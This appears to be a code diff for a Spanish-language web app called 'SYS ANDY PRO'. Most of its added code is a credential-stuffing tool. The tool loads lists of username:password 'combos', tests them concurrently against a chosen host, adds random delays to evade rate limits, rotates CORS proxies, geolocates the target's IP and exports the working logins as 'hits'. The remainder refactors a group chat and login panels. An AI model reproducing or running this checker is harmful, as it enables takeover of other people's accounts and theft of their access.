+            while (index < total && !stopRequested) {
+                const i = index++;
+                if (i >= total) break;
+                const combo = combos[i];
+                if (!combo) continue;
+                if (ui.user) ui.user.textContent = `Usuario actual: ${combo}`;
+                try {
+                    const hit = await validarCombo(host, combo, {}, null, ui, jobId);
+                    if (stopRequested) break;
+                    if (hit) {
+                        ui.hitsArr.push(hit);
+                        mostrarHit(hit, ui);
                     }
-                    updateStatsOnScan();
-                } catch(e) { } finally {
+                } catch (_) { }
+                finally {
                     processed++;
-                    fill.style.width = ((processed/total)*100)+'%'; txt.textContent = `Procesados: ${processed} / ${total}`;
-                    actualizarHeartbeat();
+                    actualizarProgresoJob({ processed, total }, ui);
                 }
+                await sleep(40 + Math.random() * 140);
+                if (stopRequested) break;
             }
         }
+        if (ui.text) ui.text.textContent = 'Conectando...';
+        await sleep((jobId - 1) * 100);
         await Promise.all(Array.from({ length: conc }, () => worker()));
+        if (ui.user) ui.user.textContent = 'Usuario actual: -';
+        if (ui.text) ui.text.textContent += (stopRequested ? ' | Scan detenido.' : ' | Scan finalizado.');
     }
-    function readTxtFile(inputEl, targetArray){ targetArray.length=0; const f=inputEl.files?.[0]; if(!f){ updateStartState(); return; } const r=new FileReader(); r.onload=e=>{ String(e.target.result).split(/\r?\n/).forEach(l=>{ if(extractCombo(l)) targetArray.push(l); }); updateStartState(); }; r.readAsText(f); }
-    if(comboFile1) comboFile1.addEventListener('change',()=>readTxtFile(comboFile1, combos1));
-    if(comboFile2) comboFile2.addEventListener('change',()=>readTxtFile(comboFile2, combos2));
-    if(comboFile3) comboFile3.addEventListener('change',()=>readTxtFile(comboFile3, combos3));
-    if(comboText) comboText.addEventListener('input',()=>{ combosTxt.length=0; comboText.value.split(/\r?\n/).forEach(l=>{ if(extractCombo(l)) combosTxt.push(l); }); updateStartState(); });
-    if(hostInput) hostInput.addEventListener('input', updateStartState);
-    if(startBtn) startBtn.addEventListener('click', async ()=>{
-        if(isRunning) return;
-        if(moanAudioContext && moanAudioContext.state==='suspended') await moanAudioContext.resume();
-        const host = hostInput.value.replace(/^https?:\/\//,'').trim();
-        // ========== ELIMINADO EL BLOQUEO DE VERIFICACIÓN DE HOST VIVO ==========
-        // El checkbox "checkAlive" ya no impide el escaneo, se ha quitado la condición.
-        // if(document.getElementById('checkAlive')?.checked && !(await isHostAlive(host, document.getElementById('tryHttpsFirst')?.checked))){
-        //     alert("⚠️ El host no responde. Verifica la dirección.");
-        //     return;
-        // }
-        // =========================================================================
-        isRunning=true; stopRequested=false;
-        startBtn.disabled=true; stopBtn.disabled=false;
-        if(combosTxt.length){ combos1=combos1.concat(combosTxt); combosTxt=[]; }
-        const conc = parseInt(concurrencyInput.value) || 80;
-        const jobs = [];
-        if(combos1.length) jobs.push(processarCombosJob(host, combos1, Math.floor(conc/3)||20, 1));
-        if(combos2.length) jobs.push(processarCombosJob(host, combos2, Math.floor(conc/3)||20, 2));
-        if(combos3.length) jobs.push(processarCombosJob(host, combos3, Math.floor(conc/3)||20, 3));
-        Promise.allSettled(jobs).then(()=>{
-            isRunning=false; stopBtn.disabled=true; startBtn.disabled=false; saveBtn.disabled=false;
-            if(document.getElementById('autoDownload')?.checked){
-                const allHits = [...HITS[1],...HITS[2],...HITS[3]];
-                if(allHits.length){
-                    let content = allHits.map(h=>h.texto).join('\n\n================\n\n');
-                    const blob = new Blob([content],{type:'text/plain'});
-                    const a = document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`scan_${host}_${new Date().toISOString().slice(0,19)}.txt`; a.click(); a.remove();
-                }
+    
+    function buildHitsTextAll() {
+        const j1 = HITS[1] || [], j2 = HITS[2] || [], j3 = HITS[3] || [];
+        const totalBruto = j1.length + j2.length + j3.length;
+        const all = [...j1, ...j2, ...j3];
+        const unique = [];
+        const seen = new Set();
+        for (const h of all) { const key = h.texto.trim(); if (key && !seen.has(key)) { seen.add(key); unique.push(h); } }
+        const header = `=============== SYS ANDY PRO ================\nScan1: ${j1.length} hits\nScan2: ${j2.length} hits\nScan3: ${j3.length} hits\nTotal (bruto): ${totalBruto} | Únicos: ${unique.length}\n================================================\n\n`;
+        const body = unique.map(h => h.texto).join('\n\n-----------------\n\n');
+        return header + (body || '');
+    }
+    
+    function domainFileName(rawHost) {
+        const h = limpiarHost(rawHost).replace(/[^a-zA-Z0-9._-]/g, '_');
+        const d = new Date();
+        const pad = n => String(n).padStart(2, '0');
+        const ts = `${d.getFullYear()}${pad(d.getMonth() + 1)}${pad(d.getDate())}_${pad(d.getHours())}${pad(d.getMinutes())}${pad(d.getSeconds())}`;
+        return `scan_${h}_${ts}.txt`;
+    }
+    
+    async function saveHitsAll(rawHost, allowEmpty = false) {
+        const content = buildHitsTextAll();
+        if (!content && !allowEmpty) { alert('No hay hits para guardar.'); return; }
+        const blob = new Blob([content || ''], { type: 'text/plain;charset=utf-8' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = domainFileName(rawHost);
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+    }
+    
+    function readTxtFile(inputEl, targetArray) {
+        targetArray.length = 0;
+        const f = inputEl.files?.[0];
+        if (!f) { updateStartState(); return; }
+        const r = new FileReader();
+        r.onload = e => {
+            const lines = String(e.target.result || '').split(/\r?\n/);
+            for (const line of lines) {
+                const pair = extractCombo(line.trim());
+                if (pair) targetArray.push(`${pair[0]}:${pair[1]}`);
             }
+            updateStartState();
+        };
+        r.readAsText(f);
+    }
+    
+    function updateStartState() {
+        const hasHost = !!document.getElementById('hostInput').value.trim();
+        const hasAnyCombos = (combos1.length || combos2.length || combos3.length || combosTxt.length);
+        document.getElementById('startBtn').disabled = !(hasHost && hasAnyCombos);
+    }
+    
+    document.getElementById('comboFile1').addEventListener('change', () => readTxtFile(document.getElementById('comboFile1'), combos1));
+    document.getElementById('comboFile2').addEventListener('change', () => readTxtFile(document.getElementById('comboFile2'), combos2));
+    document.getElementById('comboFile3').addEventListener('change', () => readTxtFile(document.getElementById('comboFile3'), combos3));
+    document.getElementById('comboText').addEventListener('input', () => {
+        combosTxt.length = 0;
+        const raw = document.getElementById('comboText').value || '';
+        if (raw) {
+            const lines = raw.split(/\r?\n/);
+            for (const line of lines) {
+                const pair = extractCombo(line);
+                if (pair) combosTxt.push(`${pair[0]}:${pair[1]}`);
+            }
+        }
+        updateStartState();
+    });
+    document.getElementById('hostInput').addEventListener('input', updateStartState);
+    
+    document.getElementById('startBtn').addEventListener('click', async () => {
+        if (isRunning) return;
+        unlockAudio();
+        if (audioCtx && audioCtx.state === 'suspended') try { await audioCtx.resume(); } catch (_) {}
+        isRunning = true;
+        stopRequested = false;
+        document.getElementById('startBtn').disabled = true;
+        document.getElementById('stopBtn').disabled = false;
+        document.getElementById('saveBtn').disabled = true;
+        document.getElementById('hitsContainer').innerHTML = '';
+        Object.values(HITS).forEach(arr => arr.length = 0);
+        [document.getElementById('progressBarFill'), document.getElementById('progressBarFill2'), document.getElementById('progressBarFill3')].forEach(el => { if (el) el.style.width = '0%'; });
+        [document.getElementById('progressText'), document.getElementById('progressText2'), document.getElementById('progressText3')].forEach(el => { if (el) el.textContent = 'Resolviendo IP...'; });
+        [document.getElementById('currentCombo'), document.getElementById('currentCombo2'), document.getElementById('currentCombo3')].forEach(el => { if (el) el.textContent = 'Usuario actual: -'; });
+        [document.getElementById('hitsCount1'), document.getElementById('hitsCount2'), document.getElementById('hitsCount3')].forEach(el => { if (el) el.innerHTML = 'Hits: <span class="yellow-hit">0</span>'; });
+        
+        const host = limpiarHost(document.getElementById('hostInput').value);
+        const baseConc = parseInt(document.getElementById('concurrencyInput').value) || 80;
+        serverIP = await resolveIP(host);
+        serverGeo = serverIP ? await fetchGeo(serverIP) : null;
+        if (combosTxt.length) { combos1 = combos1.concat(combosTxt); combosTxt = []; document.getElementById('comboText').value = ''; }
+        const activeJobs = [combos1.length > 0, combos2.length > 0, combos3.length > 0].filter(Boolean).length || 1;
+        const perConc = Math.max(1, Math.floor(baseConc / activeJobs));
+        JOB_PROXIES = {};
+        const shuffled = [...CORS_PROXIES].sort(() => Math.random() - 0.5);
+        if (combos1.length) JOB_PROXIES[1] = shuffled[0 % CORS_PROXIES.length];
+        if (combos2.length) JOB_PROXIES[2] = shuffled[1 % CORS_PROXIES.length];
+        if (combos3.length) JOB_PROXIES[3] = shuffled[2 % CORS_PROXIES.length];
+        
+        const jobs = [];
+        if (combos1.length) jobs.push(processarCombosJob(host, combos1, perConc, 1));
+        if (combos2.length) jobs.push(processarCombosJob(host, combos2, perConc, 2));
+        if (combos3.length) jobs.push(processarCombosJob(host, combos3, perConc, 3));
+        
+        if (jobs.length === 0) {
+            isRunning = false;
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('saveBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+            updateStartState();
+            return;
+        }
+        
+        Promise.allSettled(jobs).then(() => {
+            isRunning = false;
+            document.getElementById('stopBtn').disabled = true;
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('saveBtn').disabled = false;
+            if (document.getElementById('autoDownload')?.checked) {
+                const totalHits = (HITS[1]?.length || 0) + (HITS[2]?.length || 0) + (HITS[3]?.length || 0);
+                if (totalHits > 0) saveHitsAll(host, false);
+            }
+            updateStartState();
         });
     });
-    if(stopBtn) stopBtn.addEventListener('click',()=>{ stopRequested=true; });
-    if(saveBtn) saveBtn.addEventListener('click',()=>{
-        const allHits = [...HITS[1],...HITS[2],...HITS[3]];
-        if(!allHits.length){ alert("No hay hits para guardar."); return; }
-        let content = allHits.map(h=>h.texto).join('\n\n================\n\n');
-        const blob = new Blob([content],{type:'text/plain'});
-        const a = document.createElement('a'); a.href=URL.createObjectURL(blob); a.download=`scan_${hostInput.value.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.txt`; a.click(); a.remove();
+    
+    document.getElementById('stopBtn').addEventListener('click', () => {
+        if (!isRunning) return;
+        stopRequested = true;
+        document.getElementById('stopBtn').disabled = true;
+        [document.getElementById('progressText'), document.getElementById('progressText2'), document.getElementById('progressText3')].forEach(el => { if (el) el.textContent += ' | Scan detenido.'; });
     });
+    
+    document.getElementById('saveBtn').addEventListener('click', () => {
+        const host = document.getElementById('hostInput').value;
+        if (!host) { alert('Ingresa un host primero.'); return; }
+        saveHitsAll(host, true);
+    });
+    
     updateStartState();
 
     // ==================== CHAT WHATSAPP CON AUTOCOMPLETADO ====================
@@ -1587,38 +1880,34 @@
     let mentionStartPos = 0;
     let currentMentionIndex = 0;
 
-    function getUserColor(email) { let hash=0; for(let i=0;i<email.length;i++) hash=((hash<<5)-hash)+email.charCodeAt(i); const hue=Math.abs(hash%360); return `hsl(${hue}, 70%, 60%)`; }
+    function getUserColor(email) { let hash = 0; for (let i = 0; i < email.length; i++) hash = ((hash << 5) - hash) + email.charCodeAt(i); const hue = Math.abs(hash % 360); return `hsl(${hue}, 70%, 60%)`; }
     async function cargarPerfilUsuario(email) {
         const perfilRef = db.ref(`chat_profiles/${currentUser.uid}`);
         const snapshot = await perfilRef.once('value');
-        if(snapshot.exists()){ const data=snapshot.val(); chatDisplayName=data.name||email.split('@')[0]; chatAvatar=data.avatar||"🦁"; }
-        else{ chatDisplayName=email.split('@')[0]; chatAvatar="🦁"; await perfilRef.set({name:chatDisplayName, avatar:chatAvatar}); }
-        const displayNameInput = document.getElementById('displayName');
-        if(displayNameInput) displayNameInput.value=chatDisplayName;
-        const avatarSelect = document.getElementById('avatarSelect');
-        if(avatarSelect) avatarSelect.textContent=chatAvatar;
+        if (snapshot.exists()) { const data = snapshot.val(); chatDisplayName = data.name || email.split('@')[0]; chatAvatar = data.avatar || "🦁"; }
+        else { chatDisplayName = email.split('@')[0]; chatAvatar = "🦁"; await perfilRef.set({ name: chatDisplayName, avatar: chatAvatar }); }
+        document.getElementById('displayName').value = chatDisplayName;
+        document.getElementById('avatarSelect').textContent = chatAvatar;
     }
-    const saveProfileBtn = document.getElementById('saveProfileBtn');
-    if(saveProfileBtn) saveProfileBtn.addEventListener('click', async()=>{
-        const newName=document.getElementById('displayName')?.value.trim();
-        if(newName) chatDisplayName=newName;
-        chatAvatar=document.getElementById('avatarSelect')?.textContent || "🦁";
-        await db.ref(`chat_profiles/${currentUser.uid}`).set({name:chatDisplayName, avatar:chatAvatar});
+    document.getElementById('saveProfileBtn').addEventListener('click', async () => {
+        const newName = document.getElementById('displayName')?.value.trim();
+        if (newName) chatDisplayName = newName;
+        chatAvatar = document.getElementById('avatarSelect')?.textContent || "🦁";
+        await db.ref(`chat_profiles/${currentUser.uid}`).set({ name: chatDisplayName, avatar: chatAvatar });
         alert("Perfil actualizado");
     });
-    const avatarSelectElem = document.getElementById('avatarSelect');
-    if(avatarSelectElem) avatarSelectElem.addEventListener('click',()=>{
-        let newEmoji=prompt("Elige un emoji (puedes copiar y pegar):", chatAvatar);
-        if(newEmoji && newEmoji.trim()) avatarSelectElem.textContent=newEmoji.trim();
+    document.getElementById('avatarSelect').addEventListener('click', () => {
+        let newEmoji = prompt("Elige un emoji (puedes copiar y pegar):", chatAvatar);
+        if (newEmoji && newEmoji.trim()) document.getElementById('avatarSelect').textContent = newEmoji.trim();
     });
-    let chatUnsubscribe=null;
-    function iniciarChat(){
-        if(chatUnsubscribe) chatUnsubscribe();
+    let chatUnsubscribe = null;
+    function iniciarChat() {
+        if (chatUnsubscribe) chatUnsubscribe();
         const messagesRef = db.ref('chat_messages').orderByChild('timestamp').limitToLast(200);
-        chatUnsubscribe = messagesRef.on('value', (snapshot)=>{
-            const messages=[];
-            snapshot.forEach(child=>{ messages.push({id:child.key, ...child.val()}); });
-            messages.sort((a,b)=>(a.timestamp||0)-(b.timestamp||0));
+        chatUnsubscribe = messagesRef.on('value', (snapshot) => {
+            const messages = [];
+            snapshot.forEach(child => { messages.push({ id: child.key, ...child.val() }); });
+            messages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
             renderizarMensajesWhatsApp(messages);
         });
         db.ref('chat_profiles').once('value').then(snap => {
@@ -1630,18 +1919,18 @@
             });
         });
     }
-    async function renderizarMensajesWhatsApp(messages){
-        const container=document.getElementById('chatMessages');
-        if(!container) return;
-        container.innerHTML='';
-        for(const msg of messages){
+    async function renderizarMensajesWhatsApp(messages) {
+        const container = document.getElementById('chatMessages');
+        if (!container) return;
+        container.innerHTML = '';
+        for (const msg of messages) {
             const isOwn = (msg.userId === currentUser.uid);
             const wrapper = document.createElement('div');
             wrapper.className = `message-wrapper ${isOwn ? 'own' : 'other'}`;
             const bubble = document.createElement('div');
             bubble.className = 'chat-message';
             const userColor = getUserColor(msg.userId);
-            const replyHtml = msg.replyTo ? `<div class="reply-preview">↩️ Respondiendo a <strong style="color:${getUserColor(msg.replyTo.userId)}">${escapeHtml(msg.replyTo.userName)}</strong>: ${escapeHtml(msg.replyTo.text.substring(0,50))}</div>` : '';
+            const replyHtml = msg.replyTo ? `<div class="reply-preview">↩️ Respondiendo a <strong style="color:${getUserColor(msg.replyTo.userId)}">${escapeHtml(msg.replyTo.userName)}</strong>: ${escapeHtml(msg.replyTo.text.substring(0, 50))}</div>` : '';
             let actions = `<button class="msg-btn reply-btn" title="Responder">💬</button>`;
             if (currentUser.role === 'Owner' || msg.userId === currentUser.uid) {
                 actions += `<button class="msg-btn edit-btn" title="Editar">✏️</button><button class="msg-btn delete-btn" title="Eliminar">🗑️</button>`;
@@ -1651,18 +1940,18 @@
             }
             bubble.innerHTML = `
                 <div class="message-header">
-                    <span class="message-avatar">${escapeHtml(msg.avatar||'🦁')}</span>
+                    <span class="message-avatar">${escapeHtml(msg.avatar || '🦁')}</span>
                     <span class="message-name" style="color:${userColor}">${escapeHtml(msg.userName)}</span>
                     <span class="message-time">${new Date(msg.timestamp).toLocaleTimeString()}</span>
                 </div>
                 ${replyHtml}
-                <div class="message-text">${formatMessageTextWhatsApp(msg.text, msg.mentions||[])}</div>
+                <div class="message-text">${formatMessageTextWhatsApp(msg.text, msg.mentions || [])}</div>
                 <div class="message-actions">${actions}</div>
             `;
-            bubble.querySelector('.reply-btn').onclick=()=>{ currentReplyTo={ id:msg.id, userName:msg.userName, text:msg.text }; const badge=document.getElementById('replyBadge'); if(badge){ badge.style.display='flex'; badge.querySelector('span').innerHTML=`Respondiendo a ${escapeHtml(msg.userName)}: ${escapeHtml(msg.text.substring(0,40))}`; } };
-            if(bubble.querySelector('.edit-btn')) bubble.querySelector('.edit-btn').onclick=()=>editarMensaje(msg.id, msg.text);
-            if(bubble.querySelector('.delete-btn')) bubble.querySelector('.delete-btn').onclick=()=>eliminarMensaje(msg.id);
-            if(bubble.querySelector('.ban-btn')) bubble.querySelector('.ban-btn').onclick=()=>banUserById(msg.userId, msg.userName);
+            bubble.querySelector('.reply-btn').onclick = () => { currentReplyTo = { id: msg.id, userName: msg.userName, text: msg.text }; const badge = document.getElementById('replyBadge'); if (badge) { badge.style.display = 'flex'; badge.querySelector('span').innerHTML = `Respondiendo a ${escapeHtml(msg.userName)}: ${escapeHtml(msg.text.substring(0, 40))}`; } };
+            if (bubble.querySelector('.edit-btn')) bubble.querySelector('.edit-btn').onclick = () => editarMensaje(msg.id, msg.text);
+            if (bubble.querySelector('.delete-btn')) bubble.querySelector('.delete-btn').onclick = () => eliminarMensaje(msg.id);
+            if (bubble.querySelector('.ban-btn')) bubble.querySelector('.ban-btn').onclick = () => banUserById(msg.userId, msg.userName);
             wrapper.appendChild(bubble);
             container.appendChild(wrapper);
         }
@@ -1674,12 +1963,12 @@
             alert(`${name} ha sido baneado.`);
         }
     }
-    function escapeHtml(str){ return String(str).replace(/[&<>]/g, function(m){ if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
-    function formatMessageTextWhatsApp(text, mentions){
-        let html=escapeHtml(text);
-        mentions.forEach(m=>{
-            const regex=new RegExp(`@${m.userName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`, 'g');
-            html=html.replace(regex, `<span class="mention" data-userid="${m.userId}">@${escapeHtml(m.userName)}</span>`);
+    function escapeHtml(str) { return String(str).replace(/[&<>]/g, function (m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }
+    function formatMessageTextWhatsApp(text, mentions) {
+        let html = escapeHtml(text);
+        mentions.forEach(m => {
+            const regex = new RegExp(`@${m.userName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`, 'g');
+            html = html.replace(regex, `<span class="mention" data-userid="${m.userId}">@${escapeHtml(m.userName)}</span>`);
         });
         return html;
     }
@@ -1689,7 +1978,6 @@
         const suggestionsDiv = document.createElement('div');
         suggestionsDiv.className = 'mention-suggestions';
         input.parentNode.appendChild(suggestionsDiv);
-
         function hideSuggestions() { suggestionsDiv.style.display = 'none'; mentionActive = false; }
         function showSuggestions(filter) {
             const filtered = mentionUsersList.filter(u => u.name.toLowerCase().includes(filter.toLowerCase()));
@@ -1711,12 +1999,11 @@
             suggestionsDiv.style.display = 'block';
             mentionActive = true;
         }
-
         input.addEventListener('input', (e) => {
             const cursorPos = input.selectionStart;
             const text = input.value;
             const atIndex = text.lastIndexOf('@', cursorPos - 1);
-            if (atIndex !== -1 && (atIndex === 0 || text[atIndex-1] === ' ' || text[atIndex-1] === '\n')) {
+            if (atIndex !== -1 && (atIndex === 0 || text[atIndex - 1] === ' ' || text[atIndex - 1] === '\n')) {
                 const afterAt = text.substring(atIndex + 1, cursorPos);
                 if (!afterAt.includes(' ') && !afterAt.includes('\n')) {
                     mentionStartPos = atIndex;
@@ -1737,38 +2024,35 @@
         document.addEventListener('click', (e) => { if (!suggestionsDiv.contains(e.target) && e.target !== input) hideSuggestions(); });
     }
 
-    async function enviarMensajeWhatsApp(){
-        const input=document.getElementById('chatInput');
-        let text=input.value.trim();
-        if(!text) return;
+    async function enviarMensajeWhatsApp() {
+        const input = document.getElementById('chatInput');
+        let text = input.value.trim();
+        if (!text) return;
         if (await isUserBanned(currentUser.uid)) { alert("⛔ Has sido baneado, no puedes enviar mensajes."); return; }
-        const mentionRegex=/@(\w+)/g;
+        const mentionRegex = /@(\w+)/g;
         let match;
-        const mentions=[];
-        while((match=mentionRegex.exec(text))!==null){
-            const mentionedName=match[1];
+        const mentions = [];
+        while ((match = mentionRegex.exec(text)) !== null) {
+            const mentionedName = match[1];
             const found = mentionUsersList.find(u => u.name.toLowerCase() === mentionedName.toLowerCase());
-            if(found && !mentions.some(m=>m.userId===found.id)) mentions.push({ userId: found.id, userName: found.name });
+            if (found && !mentions.some(m => m.userId === found.id)) mentions.push({ userId: found.id, userName: found.name });
         }
-        const msgData={ userId:currentUser.uid, userName:chatDisplayName, avatar:chatAvatar, text:text, timestamp:Date.now(), mentions:mentions };
-        if(currentReplyTo){ msgData.replyTo={ id:currentReplyTo.id, userId:currentReplyTo.userId, userName:currentReplyTo.userName, text:currentReplyTo.text.substring(0,100) }; currentReplyTo=null; const badge=document.getElementById('replyBadge'); if(badge) badge.style.display='none'; }
+        const msgData = { userId: currentUser.uid, userName: chatDisplayName, avatar: chatAvatar, text: text, timestamp: Date.now(), mentions: mentions };
+        if (currentReplyTo) { msgData.replyTo = { id: currentReplyTo.id, userId: currentReplyTo.userId, userName: currentReplyTo.userName, text: currentReplyTo.text.substring(0, 100) }; currentReplyTo = null; const badge = document.getElementById('replyBadge'); if (badge) badge.style.display = 'none'; }
         await db.ref('chat_messages').push(msgData);
-        for (let m of mentions) if (m.userId !== currentUser.uid) showNotification(`📢 Te han mencionado`, `${chatDisplayName} te mencionó: ${text.substring(0,50)}`);
-        input.value='';
+        for (let m of mentions) if (m.userId !== currentUser.uid) showNotification(`📢 Te han mencionado`, `${chatDisplayName} te mencionó: ${text.substring(0, 50)}`);
+        input.value = '';
     }
-    async function editarMensaje(msgId, oldText){
-        const newText=prompt("Editar mensaje:", oldText);
-        if(newText && newText!==oldText) await db.ref(`chat_messages/${msgId}`).update({ text:newText, edited:true });
+    async function editarMensaje(msgId, oldText) {
+        const newText = prompt("Editar mensaje:", oldText);
+        if (newText && newText !== oldText) await db.ref(`chat_messages/${msgId}`).update({ text: newText, edited: true });
     }
-    async function eliminarMensaje(msgId){
-        if(confirm("¿Eliminar este mensaje?")) await db.ref(`chat_messages/${msgId}`).remove();
+    async function eliminarMensaje(msgId) {
+        if (confirm("¿Eliminar este mensaje?")) await db.ref(`chat_messages/${msgId}`).remove();
     }
-    const sendMsgBtn = document.getElementById('sendMsgBtn');
-    if(sendMsgBtn) sendMsgBtn.addEventListener('click', enviarMensajeWhatsApp);
-    const chatInputElem2 = document.getElementById('chatInput');
-    if(chatInputElem2) chatInputElem2.addEventListener('keypress', (e)=>{ if(e.key==='Enter' && !e.shiftKey){ e.preventDefault(); enviarMensajeWhatsApp(); } });
-    const cancelReplyBtn = document.getElementById('cancelReplyBtn');
-    if(cancelReplyBtn) cancelReplyBtn.addEventListener('click', ()=>{ currentReplyTo=null; const badge=document.getElementById('replyBadge'); if(badge) badge.style.display='none'; });
+    document.getElementById('sendMsgBtn').addEventListener('click', enviarMensajeWhatsApp);
+    document.getElementById('chatInput').addEventListener('keypress', (e) => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); enviarMensajeWhatsApp(); } });
+    document.getElementById('cancelReplyBtn').addEventListener('click', () => { currentReplyTo = null; document.getElementById('replyBadge').style.display = 'none'; });
 
     // ==================== MODO OSCURO/CLARO ====================
     document.getElementById('themeToggleBtn').addEventListener('click', () => {
@@ -1778,17 +2062,17 @@
     if (localStorage.getItem('theme') === 'light') document.body.classList.add('light-mode');
 
     // ==================== MOSTRAR/OCULTAR LOGIN/REGISTRO ====================
-    document.getElementById('showLoginBtn').addEventListener('click',()=>{
-        document.getElementById('loginPanel').style.display='block';
-        document.getElementById('registerPanel').style.display='none';
-        document.getElementById('showLoginBtn').style.background='#ff8833';
-        document.getElementById('showRegisterBtn').style.background='#442222';
+    document.getElementById('showLoginBtn').addEventListener('click', () => {
+        document.getElementById('loginPanel').style.display = 'block';
+        document.getElementById('registerPanel').style.display = 'none';
+        document.getElementById('showLoginBtn').style.background = '#ff8833';
+        document.getElementById('showRegisterBtn').style.background = '#442222';
     });
-    document.getElementById('showRegisterBtn').addEventListener('click',()=>{
-        document.getElementById('loginPanel').style.display='none';
-        document.getElementById('registerPanel').style.display='block';
-        document.getElementById('showRegisterBtn').style.background='#ff8833';
-        document.getElementById('showLoginBtn').style.background='#442222';
+    document.getElementById('showRegisterBtn').addEventListener('click', () => {
+        document.getElementById('loginPanel').style.display = 'none';
+        document.getElementById('registerPanel').style.display = 'block';
+        document.getElementById('showRegisterBtn').style.background = '#ff8833';
+        document.getElementById('showLoginBtn').style.background = '#442222';
     });
 
     document.addEventListener('DOMContentLoaded', () => {
